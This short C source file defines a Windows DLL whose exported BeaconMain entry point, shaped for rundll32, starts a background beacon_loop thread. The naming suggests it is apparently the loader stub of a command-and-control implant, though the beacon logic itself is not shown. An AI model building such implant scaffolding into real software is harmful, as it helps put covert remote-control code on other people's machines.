#include <beacon.h>

__declspec(dllexport) void WINAPI BeaconMain(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    (void)hwnd; (void)hinst; (void)lpszCmdLine; (void)nCmdShow;
    HANDLE hThread = CreateThread(NULL, 0, beacon_loop, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    (void)lpvReserved;
    if (fdwReason == DLL_PROCESS_ATTACH)
        DisableThreadLibraryCalls(hinstDLL);
    return TRUE;
}